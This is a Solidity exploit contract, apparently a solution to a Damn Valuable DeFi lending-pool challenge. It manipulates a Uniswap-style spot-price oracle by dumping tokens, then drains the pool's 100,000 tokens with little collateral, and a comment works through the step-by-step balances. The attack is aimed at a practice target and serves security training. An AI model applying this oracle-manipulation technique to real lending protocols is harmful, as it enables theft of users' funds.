// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./PuppetPool.sol";

contract AttackP {

    constructor (address PP, address DVT, address uniPair, address player, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) payable {

        DamnValuableToken(DVT).permit(player,address(this),value,deadline,v,r,s);
        DamnValuableToken(DVT).transferFrom(player,address(this),DamnValuableToken(DVT).balanceOf(player));
        
        DamnValuableToken(DVT).approve(uniPair,type(uint256).max);

        bytes memory encodedParams = abi.encodeWithSelector(bytes4(keccak256("tokenToEthTransferInput(uint256,uint256,uint256,address)")),DamnValuableToken(DVT).balanceOf(address(this)),1,deadline,address(this));    
        (bool successT,) = uniPair.call(encodedParams);
        require(successT, "cannot sell tokens");        

        PuppetPool(PP).borrow{value: 32 ether}(15000 ether,address(this));

        encodedParams = abi.encodeWithSelector(bytes4(keccak256("tokenToEthTransferInput(uint256,uint256,uint256,address)")),DamnValuableToken(DVT).balanceOf(address(this)),1,deadline,address(this));
        (bool successT2,) = uniPair.call(encodedParams);
        require(successT2, "cannot sell tokens 2");

        PuppetPool(PP).borrow{value: 2 ether}(85000 ether,address(this));

        encodedParams = abi.encodeWithSelector(bytes4(keccak256("ethToTokenTransferInput(uint256,uint256,address)")),1,deadline,address(this));        
        (bool successE,) = uniPair.call{value: 1 ether}(encodedParams);
        require(successE,"cannot sell eth");

        DamnValuableToken(DVT).transfer(player,DamnValuableToken(DVT).balanceOf(address(this)));
    }

    receive () external payable {}
}

contract sellingTokens {
    uint256 public deth;
    uint256 public newETH;
    uint256 public newTOKEN;

    function getPrice(uint256 eth, uint256 token, uint256 dtoken) public {
        deth = eth*dtoken*997/(1000*token+997*dtoken);
        newETH = eth - deth;
        newTOKEN = token + dtoken;
    }
}

/* 
    uni: 10 eth & 10 DVT
    price: 1 eth/DVT
    me: 25 eth & 1000 DVT
    pool: 100000 DVT

    sell 1000 DVT
    uni: 1 eth & 1010 DVT
    price: 0.00099
    me: 34 eth & 0 DVT
    
    borrow: 15000 DVT
    me: 4.3 eth & 15000 DVT
    pool: 85000 DVT

    sell 15000 DVT
    uni: 0.063264 eth & 16010 DVT
    price: 0.00000395
    me: 5.236 & 0 DVT

    borrow: 85000
    me: 4.564 eth & 85000 DVT
    pool: 0 DVT

    sell 1 eth
    uni: 1.063 eth & 955.28 DVT
    price: 0.00111
    me: 3.564 eth & 100054 DVT
*/
